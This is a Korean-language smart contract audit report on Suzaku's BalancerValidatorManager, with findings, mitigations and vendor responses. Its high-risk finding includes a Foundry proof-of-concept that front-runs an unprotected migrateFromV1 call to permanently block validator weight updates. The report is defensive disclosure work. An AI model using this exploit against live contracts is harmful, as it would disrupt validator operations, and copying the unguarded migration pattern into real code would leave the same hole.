**Lead Auditors**

[Kage](https://x.com/0kage_eth)

[Zark](https://x.com/zarkk01)

**Assisting Auditors**


---

# 발견 사항 (Findings)
## 높은 위험 (High Risk)


### `ValidatorManager::migrateFromV1`의 접근 제어 누락으로 인해 프론트러닝 공격이 검증인 작업을 영구적으로 차단할 수 있음

**설명:** `ValidatorManager::migrateFromV1` 함수에는 접근 제어가 없어 공격자가 악의적인 `receivedNonce` 값으로 합법적인 V1에서 V2로의 검증인 마이그레이션을 프론트러닝할 수 있습니다. 이는 검증인 상태를 영구적으로 손상시켜 모든 가중치 업데이트 작업에 대해 되돌릴 수 없는 서비스 거부(DoS)를 유발하고 검증인 제거를 방지합니다.

`ValidatorManager::migrateFromV1`은 접근 제어 수정자 없이 external로 표시됩니다.

```solidity
//ValidatorManager.sol
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external { //@audit no access control
    ValidatorManagerStorage storage $ = _getValidatorManagerStorage();
    ValidatorLegacy storage legacy = $._validationPeriodsLegacy[validationID];
    if (legacy.status == ValidatorStatus.Unknown) {
        revert InvalidValidationID(validationID);
    }
    if (receivedNonce > legacy.messageNonce) {
        revert InvalidNonce(receivedNonce);
    } //@audit only checks receivedNonce > legacy message Nonce

    $._validationPeriods[validationID] = Validator({
        status: legacy.status,
        nodeID: legacy.nodeID,
        startingWeight: legacy.startingWeight,
        sentNonce: legacy.messageNonce,
        receivedNonce: receivedNonce,  // ← Attacker-controlled
        weight: legacy.weight,
        startTime: legacy.startedAt,
        endTime: legacy.endedAt
    });

    $._validationPeriodsLegacy[validationID].status = ValidatorStatus.Unknown;
}
```

그러나 `BalancerValidatorManager`에는 `onlyOwner` 수정자가 있습니다.

```solidity
//BalancerValidatorManager.sol
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external onlyOwner { //@audit owner only
    VALIDATOR_MANAGER.migrateFromV1(validationID, receivedNonce);
}
```

`receivedNonce`에 대한 확인(위에서 강조 표시됨)은 `receivedNonce`를 레거시 `messageNonce`보다 높게 설정하는 것을 방지하지만 0을 포함하여 임의로 낮은 값을 허용합니다. 이는 `receivedNonce`가 단조 증가해야 하며 P-Chain 승인의 실제 상태를 나타내야 한다는 중요한 불변성을 깨뜨립니다.

다음과 같은 시나리오를 고려해 보십시오.
- 시스템에 V2로 마이그레이션해야 하는 검증인이 레거시 저장소(`_validationPeriodsLegacy`)에 있음(예: `receivedNonce` = 10, `sentNonce` = 10)
- 합법적인 소유자가 올바른 `receivedNonce` 값으로 `BalancerValidatorManager::migrateFromV1`을 호출할 준비를 함
- 공격자가 `receivedNonce = 0`으로 `ValidatorManager::migrateFromV1`을 호출하여 이를 프론트러닝함
- 업데이트 후, P-chain에 보류 중인 승인이 없더라도 `validator.sentNonce > validator.receivedNonce`이므로 `_hasPendingWeightMsg`는 항상 `true`가 됨
- `initiateValidatorWeightUpdate`에 대한 모든 추가 호출은 항상 되돌려짐(revert)


**영향:** 보류 중인 V1 마이그레이션이 있는 경우 가중치 업데이트는 영구적인 서비스 거부(DoS)에 직면하게 됩니다.

**개념 증명 (Proof of Concept):** `BalancerValidatorManager.t.sol`에 다음 테스트를 추가하십시오.

```solidity
       function testExploit_FrontRunMigration_PermanentDoS() public {
        // Register a new validator through the security module
        vm.prank(testSecurityModules[0]);
        bytes32 targetValidationID = validatorManager.initiateValidatorRegistration(
            VALIDATOR_NODE_ID_01,
            VALIDATOR_01_BLS_PUBLIC_KEY,
            pChainOwner,
            pChainOwner,
            VALIDATOR_WEIGHT
        );

        // complete the registration
        vm.prank(testSecurityModules[0]);
        validatorManager.completeValidatorRegistration(
            COMPLETE_VALIDATOR_REGISTRATION_MESSAGE_INDEX
        );

        // Verify validator is active
        Validator memory validator = ValidatorManager(vmAddress).getValidator(targetValidationID);
        assertEq(
            uint8(validator.status), uint8(ValidatorStatus.Active), "Validator should be active"
        );
        assertEq(validator.sentNonce, 0, "Initial sentNonce should be 0");
        assertEq(validator.receivedNonce, 0, "Initial receivedNonce should be 0");

        // warp beyond churn period
        vm.warp(1_704_067_200 + 2 hours);

        // Update 1: Increase weight to 200,000
        vm.prank(testSecurityModules[0]);
        (uint64 nonce1,) =
            validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
        assertEq(nonce1, 1, "First update should have nonce 1");

        vm.prank(testSecurityModules[0]);
        validatorManager.completeValidatorWeightUpdate(
            COMPLETE_VALIDATOR_WEIGHT_UPDATE_MESSAGE_INDEX
        );

        // Verify state after updates
        Validator memory currentValidator =
            ValidatorManager(vmAddress).getValidator(targetValidationID);

        assertEq(currentValidator.sentNonce, 1, "Should have sent 1 update");
        assertEq(currentValidator.receivedNonce, 1, "Should have received 1 acknowledgment");
        assertEq(currentValidator.weight, 200_000, "Weight should be updated");

        //// *** Setup V1 -> V2 Migration ***

        bytes32 storageSlot = 0xe92546d698950ddd38910d2e15ed1d923cd0a7b3dde9e2a6a3f380565559cb00;

        // _validationPeriodsLegacy is at offset 5
        bytes32 legacyMappingSlot = bytes32(uint256(storageSlot) + 5);
        bytes32 legacyValidatorSlot = keccak256(abi.encode(targetValidationID, legacyMappingSlot));
        vm.store(vmAddress, legacyValidatorSlot, bytes32(uint256(2)));

        // Store actual nodeID data
        bytes32 nodeIDPacked = bytes32(VALIDATOR_NODE_ID_01) | bytes32(uint256(20) << 1); // length in last byte (length * 2 for short bytes)
        vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 1), nodeIDPacked);

        // Slot 2: startingWeight
        bytes32 slot2Value = bytes32(
            (uint256(currentValidator.startTime) << 192) // startedAt first (leftmost)
                | (uint256(200_000) << 128) // weight
                | (uint256(1) << 64) // messageNonce = 1
                | uint256(currentValidator.startingWeight) // startingWeight (rightmost)
        );
        vm.store(vmAddress, bytes32(uint256(legacyValidatorSlot) + 2), slot2Value);

        // Slot 3: endedAt
        vm.store(
            vmAddress,
            bytes32(uint256(legacyValidatorSlot) + 3),
            bytes32(uint256(currentValidator.endTime))
        );

        // Legitimate owner wants to migrate with correct receivedNonce = 2
        // But attacker's transaction executes first with receivedNonce = 0

        address attacker = address(0x6666);

        vm.prank(attacker);
        ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 0);

        // Verify corrupted state
        Validator memory corruptedValidator =
            ValidatorManager(vmAddress).getValidator(targetValidationID);

        assertEq(corruptedValidator.sentNonce, 1, "sentNonce should be 1 from legacy");
        assertEq(corruptedValidator.receivedNonce, 0, "receivedNonce corrupted to 0 by attacker");
        assertEq(
            uint8(corruptedValidator.status), uint8(ValidatorStatus.Active), "Should be Active"
        );

        // Legitimate owner cannot fix the migration

        // Owner tries to migrate with correct value but it's too late
        vm.prank(validatorManagerOwnerAddress);
        vm.expectRevert(); // Will revert because legacy.status was set to Unknown
        ValidatorManager(vmAddress).migrateFromV1(targetValidationID, 1);

        // IMPACT 2: Cannot initiate weight updates (Permanent DoS)

        // First, we need to assign this validator to a security module
        // In the real scenario, this would happen during normal operation
        bytes32 balancerStorageSlot =
            0x9d2d7650aa35ca910e5b713f6b3de6524a06fbcb31ffc9811340c6f331a23400;

        bytes32 validatorSecurityModuleMappingSlot = bytes32(uint256(balancerStorageSlot) + 2);
        bytes32 validatorSecurityModuleSlot =
            keccak256(abi.encode(targetValidationID, validatorSecurityModuleMappingSlot));

        vm.store(
            address(validatorManager),
            validatorSecurityModuleSlot,
            bytes32(uint256(uint160(testSecurityModules[0])))
        );

        // Try to initiate weight update from security module
        vm.prank(testSecurityModules[0]);
        vm.expectRevert(
            abi.encodeWithSelector(
                IBalancerValidatorManager.BalancerValidatorManager__PendingWeightUpdate.selector,
                targetValidationID
            )
        );
        validatorManager.initiateValidatorWeightUpdate(targetValidationID, 200_000);
    }
```

**권장 완화 조치:** 레거시 저장소에 검증인이 있는 `ValidatorManager` 위에 `BalancerValidatorManager`를 배포하지 마십시오. 또는 `BalancerValidatorManager`가 배포되기 전에 V1 마이그레이션을 완료하십시오.

**Suzaku:** 인지함. ValidatorManager.migrateFromV1은 무허가(permissionless)이며 프론트런될 수 있습니다. 우리는 운영적으로 완화할 것입니다: 모든 V1 마이그레이션을 비공개로 완료하고, 레거시 매핑이 비어 있는지 확인한 다음 BalancerValidatorManager를 연결합니다. Balancer가 연결된 후에는 마이그레이션이 없습니다.

**Cyfrin:** 인지함.

\clearpage
## 낮은 위험 (Low Risk)


### 마이그레이션 프로세스에서 가중치가 0이고 비활성 상태인 검증인 포함 허용

**설명:** `BalancerValidatorManager::initialize()` 함수의 마이그레이션 로직은 마이그레이션되는 검증인의 상태나 가중치를 검증하지 않습니다. 이를 통해 총 가중치 계산이 일관되게 유지되는 한, 가중치가 0인 비활성 검증인이 마이그레이션 프로세스 중에 보안 모듈에 할당될 수 있습니다.

`initiateValidatorRemoval()`을 통해 검증인 제거가 시작되면 `ValidatorManager`는 가중치를 0으로 설정하고 상태를 `PendingRemoved`로 설정합니다. 그러나 검증인의 ID는 유효한 상태로 유지되며 쿼리할 수 있습니다. 마이그레이션 중에 컨트랙트는 다음 사항만 확인합니다.

- 검증인 ID가 존재함(0이 아님)
- 검증인이 이전에 마이그레이션되지 않았음
- 가중치의 합이 총 L1 가중치와 같음

`PendingRemoved`, `Completed`와 같은 상태의 검증인은 가중치가 0일 수 있지만 가중치의 합이 총계와 같은 활성 검증인과 함께 포함되면 모든 검증 확인을 통과할 수 있습니다.

**영향:** 보안 모듈은 제거 대기 중이거나 이미 무효화된 검증인을 포함하여 관리해서는 안 되는 검증인에 대한 제어권을 얻습니다. 또 다른 가능성은 P-Chain이 제거 요청을 거부하고 `PendingRemoved` 검증인이 `Active` 상태로 되돌아가는 경우, 보안 모듈이 명시적으로 등록하지 않고도 이미 해당 검증인을 소유하게 된다는 것입니다.

**권장 완화 조치:** 마이그레이션 중에 검증인 상태와 가중치를 확인하는 명시적 검증을 추가하는 것을 고려하십시오.

**Suzaku:** [f6c3444](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/f6c3444e580ee54a6014bff72f562a31a2bd04c8)에서 수정됨.

**Cyfrin:** 확인함.


### `BalancerValidatorManager::initiateValidatorRegistration`을 통해 가중치가 0인 검증인 등록 가능

**설명:** `BalancerValidatorManager::initiateValidatorRegistration` 함수는 기본 `ValidatorManager`에 위임하기 전에 가중치 매개변수가 0이 아닌지 검증하지 않습니다. 또한 `ValidatorManager::_initiateValidatorRegistration` 함수에도 0 가중치 확인이 없어 투표권이 0인 검증인을 시스템에 등록할 수 있습니다.

코드베이스는 이미 `BalancerValidatorManager::initiateValidatorWeightUpdate`에서 0 가중치에 대해 검증하지만 `BalancerValidatorManager::initiateValidatorRegistration`에서는 그렇지 않다는 점에 유의하십시오.

```solidity
//BalancerValidatorManager.sol
function initiateValidatorWeightUpdate(
    bytes32 validationID,
    uint64 newWeight
) external onlySecurityModule returns (uint64 nonce, bytes32 messageID) {
    if (newWeight == 0) {  // @audit Zero-weight check exists here but not in initiateValidatorRegistration
        revert BalancerValidatorManager__NewWeightIsZero();
    }
    // ...
}
```

**영향:** 가중치가 0인 검증인은 검증인 슬롯을 차지하지만 합의에 투표권을 기여하지 않습니다.

**권장 완화 조치:** `initiateValidatorWeightUpdate`에서 사용되는 검증 패턴과 일치하도록 `initiateValidatorRegistration`에서 가중치를 검증하는 것을 고려하십시오.

**Suzaku:** [8c3ffac](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/8c3ffac2501278117dcc6965d02f9e97eb9c5e1f)에서 수정됨.

**Cyfrin:** 확인함.


### 보안 모듈 제거로 인해 검증인 제거 완료가 차단될 수 있음

**설명:** 모듈의 추적된 가중치가 0이 되는 즉시 `BalancerValidatorManager::setUpSecurityModule(module, 0)`을 통해 보안 모듈을 제거하는 것이 허용됩니다.

```solidity
// BalancerValidatorManager::_setUpSecurityModule
if (maxWeight == 0) {
    // Forbid removal while weight > 0
    if (currentWeight != 0) {
        revert BalancerValidatorManager__CannotRemoveModuleWithWeight(securityModule);
    }
    if (!$.securityModules.remove(securityModule)) {
        revert BalancerValidatorManager__SecurityModuleNotRegistered(securityModule);
    }
}
```
모듈이 마지막 검증인의 제거를 막 시작한 경우, `completeValidatorRemoval`이 실행될 때까지 부기는 여전히 `validatorSecurityModule[validatorID] = module`을 유지하지만 보안 모듈의 현재 가중치는 0으로 만듭니다.

```solidity
// BalancerValidatorManager::initiateValidatorRemoval()
_updateSecurityModuleWeight(
    msg.sender, $.securityModuleWeight[msg.sender] - validator.weight
);
```
모듈이 `securityModules`에서 제거되면 `onlySecurityModule` 수정자는 해당 완료를 영원히 차단하여 검증인을 `PendingRemoved` 상태에 갇히게 합니다.

```solidity
// BalancerValidatorManager::completeValidatorRemoval
function completeValidatorRemoval(
    uint32 messageIndex
) external onlySecurityModule returns (bytes32 validationID) {
```

**영향:** 검증인 제거 완료가 불가능해지고 검증인은 `PendingRemoved` 상태로 유지됩니다. 심각한 상태가 위험에 처하지는 않지만, 이 검증인이 다른 보안 모듈에 등록될 예정인 경우 운영 문제와 검증인 DoS를 유발할 수 있습니다.

**개념 증명 (Proof of Concept):** 문제를 더 잘 이해하기 위해 다음 의사 코드 시나리오를 고려해 보십시오.
```solidity
// 1) Initiate removal; weight drops to 0 but validator mapping remains.
balancer.initiateValidatorRemoval(lastValidator);

// 2) Owner removes the module while cleanup is still pending.
balancer.setUpSecurityModule(module, 0);

// 3) Completion reverts: module is no longer recognised.
balancer.completeValidatorRemoval(msgIndex); // reverts BalancerValidatorManager__SecurityModuleNotRegistered
```

**권장 완화 조치:** `setUpSecurityModule`에서 `maxWeight == 0`을 허용하기 전에 해당 모듈에 할당된 검증인 ID(제거 대기 중인 항목 포함)가 없는지 확인하십시오. 또는 모듈별 참조 카운트를 추적하고 제거 전에 0이어야 합니다.

**Suzaku:** [c962239](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/c96223946ed24875e85cb44d37f76914e4dcebee)에서 수정됨.

**Cyfrin:** 확인함.


### `BalancerValidatorManager::initialize`가 `PendingAdded` 검증인에 대한 `registrationInitWeight` 채우기를 생략함

**설명:** `BalancerValidatorManager::initialize`는 마이그레이션된 각 검증인을 보안 모듈에 할당하고 가중치를 크레딧으로 제공하지만, 기본 `ValidatorManager`에서 이미 `PendingAdded` 상태인 검증인에 대해서는 `registrationInitWeight`를 절대 시드하지 않습니다. 그러한 보류 중인 등록이 나중에 실패하고 `completeValidatorRemoval`이 실행되면 가드 `if (registrationWeight != 0)`가 거짓(false)으로 평가되고 모듈의 추적된 가중치가 절대 릴리스되지 않습니다.

```solidity
/// In initialize migration loop
$.validatorSecurityModule[validationID] = settings.initialSecurityModule;
migratedValidatorsTotalWeight += VALIDATOR_MANAGER.getValidator(validationID).weight;
/// ^ Missing: if status == PendingAdded, seed registrationInitWeight[validationID] = weight.

/// In completeValidatorRemoval, we are on Case B and only decrements module weight if seeded:
// Case A (normal removal): we already freed the weight in initiateValidatorRemoval() → nothing to do.
// Case B (expired-before-activation): no initiateValidatorRemoval() happened, so undo the init add once.
uint64 registrationWeight = $.registrationInitWeight[validationID];
if (registrationWeight != 0) {
    address securityModule = $.validatorSecurityModule[validationID];
    uint64 weight = $.securityModuleWeight[securityModule];
    uint64 updatedWeight = (weight > registrationWeight) ? (weight - registrationWeight) : 0;
    _updateSecurityModuleWeight(securityModule, updatedWeight);
    delete $.registrationInitWeight[validationID];
}
```

**영향:** `PendingAdded` 검증인을 보유한 보안 모듈은 등록이 실패할 경우 영구적으로 쿼터가 잠길(quota-locked) 수 있습니다. `_updateSecurityModuleWeight`는 모든 향후 등록 시 모듈의 최대 가중치를 강제하므로 소유자가 수동으로 한도를 늘릴 때까지 모듈은 더 이상 검증인을 추가하거나 재조정할 수 없습니다. 그 외에도 보안 모듈의 기록된 가중치는 **영구적으로** 부정확할 것입니다.

**개념 증명 (Proof of Concept):**
1. 마이그레이션 전: VM에는 `Active` `total=100`과 하나의 `PendingAdded` 검증인 20이 있어 `l1TotalWeight=120`입니다.
2. 해당 `nodeID`를 포함하는 `migratedValidators`로 마이그레이션하고 루프는 `validatorSecurityModule[...]`을 설정하고 `migratedValidatorsTotalWeight`에 20을 추가하지만, `registrationInitWeight`는 설정하지 **않습니다**(!).
3. `PendingAdded` 검증인의 등록이 실패하고 호출자는 `completeValidatorRemoval`을 실행합니다. BVM은 모듈 가중치를 20만큼 감소시키지 않아(`if (registrationWeight != 0) { ... }`에 의해 보호됨), 실제 가중치는 100인 상태에서 모듈을 120에 갇히게 합니다.

**권장 완화 조치:** 상태가 `PendingAdded`인 검증인을 감지하고 `registrationInitWeight[validationID] = validator.weight`를 미리 채워 실패한 등록이 모듈 가중치를 올바르게 되돌리도록 하십시오.

```solidity
// record init weight for pending adds so later failures decrement module weight
Validator memory v = VALIDATOR_MANAGER.getValidator(validationID);
if (v.status == ValidatorStatus.PendingAdded) {
    $.registrationInitWeight[validationID] = v.weight;
}
```

**Suzaku:** [f6c3444](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/f6c3444e580ee54a6014bff72f562a31a2bd04c8)에서 수정됨.

**Cyfrin:** 확인함.

\clearpage
## 정보 (Informational)


### `BalancerValidatorManager::migrateFromV1`에 대한 중복 소유권 가드

**설명:** `BalancerValidatorManager::migrateFromV1`은 접근을 소유자로 제한하지만, 래핑된 `ValidatorManager::migrateFromV1`은 의도적으로 무허가(permissionless)입니다. 밸런서를 통한 호출은 실질적인 보호를 추가하지 않으며 누가 마이그레이션을 트리거해야 하는지에 대해 독자를 오도할 수 있습니다.

```solidity
// BalancerValidatorManager.sol
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external onlyOwner {
    VALIDATOR_MANAGER.migrateFromV1(validationID, receivedNonce);
}

// ValidatorManager.sol
function migrateFromV1(bytes32 validationID, uint32 receivedNonce) external {
    ValidatorManagerStorage storage $ = _getValidatorManagerStorage();
    ValidatorLegacy storage legacy = $._validationPeriodsLegacy[validationID];
```

**영향:** 마이그레이션은 여전히 작동하지만(소유자가 래퍼를 통해 중계하거나 누구나 기본 검증인 관리자를 직접 호출할 수 있음), 중복 가드는 혼란을 야기할 수 있습니다.

**권장 완화 조치:** `BalancerValidatorManager::migrateFromV1`의 가시성을 `ValidatorManager::migrateFromV1`의 가시성과 일치시키거나 누구나 여전히 기본 검증인 관리자를 직접 호출할 수 있음을 문서화하는 것이 좋습니다.

**Suzaku:** [442c75c](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/442c75c7ec0a77a9c03d24f58e0a548a5587475c)에서 수정됨.

**Cyfrin:** 확인함.


### 보안 모듈 가중치 업데이트에 대한 이벤트 방출 누락

**설명:** `BalancerValidatorManager::_updateSecurityModuleWeight` 함수는 가중치의 점진적 탈중앙화라는 핵심 가치 제안에 영향을 미치는 중요한 상태 변경을 수행하지만 이벤트를 방출하지 않습니다.

이는 특히 가중치 롤백이 외부 관찰자에게 완전히 보이지 않는 만료된 검증인 등록 엣지 케이스의 경우 관찰 가능성 격차를 만듭니다.

`BalancerValidatorManager::_updateSecurityModuleWeight` 내부 함수는 보안 모듈 가중치를 업데이트하기 위해 네 군데에서 호출됩니다.

`initiateValidatorRegistration` - 모듈 가중치를 낙관적으로 증가시킴
`initiateValidatorRemoval` - 모듈 가중치를 감소시킴
`initiateValidatorWeightUpdate` - 델타만큼 모듈 가중치를 조정함
`completeValidatorRemoval` - 만료된 등록에 대해 가중치를 롤백함

위의 모든 함수는 `ValidatorManager`에서 자체 방출을 가지고 있지만, 등록 만료 시 가중치가 롤백되는 경우는 사실상 보이지 않습니다.

```solidity
function completeValidatorRemoval(uint32 messageIndex) external onlySecurityModule returns (bytes32 validationID) {
    // ...
    validationID = VALIDATOR_MANAGER.completeValidatorRemoval(messageIndex);

    // Case A: Normal removal - weight already freed in initiateValidatorRemoval()
    // Case B: Expired-before-activation - weight needs rollback
    uint64 registrationWeight = $.registrationInitWeight[validationID];
    if (registrationWeight != 0) {
        address securityModule = $.validatorSecurityModule[validationID];
        uint64 weight = $.securityModuleWeight[securityModule];
        uint64 updatedWeight = (weight > registrationWeight) ? (weight - registrationWeight) : 0;
        _updateSecurityModuleWeight(securityModule, updatedWeight); // @audit no event emission
        delete $.registrationInitWeight[validationID];
    }
    // ...
}
```

**권장 완화 조치:** `IBalancerValidatorManager.sol`에 새 이벤트를 추가하는 것을 고려하십시오.

```solidity
/**
 * @notice Emitted when a security module's weight changes
 * @param securityModule The address of the security module
 * @param oldWeight The previous weight
 * @param newWeight The new weight
 * @param maxWeight The maximum weight allocation for this module
 */
event SecurityModuleWeightUpdated(
    address indexed securityModule,
    uint64 oldWeight,
    uint64 newWeight,
    uint64 maxWeight
);
```

**Suzaku:** [442c75c](https://github.com/suzaku-network/suzaku-contracts-library/pull/89/commits/442c75c7ec0a77a9c03d24f58e0a548a5587475c)에서 수정됨.

**Cyfrin:** 확인함.

\clearpage

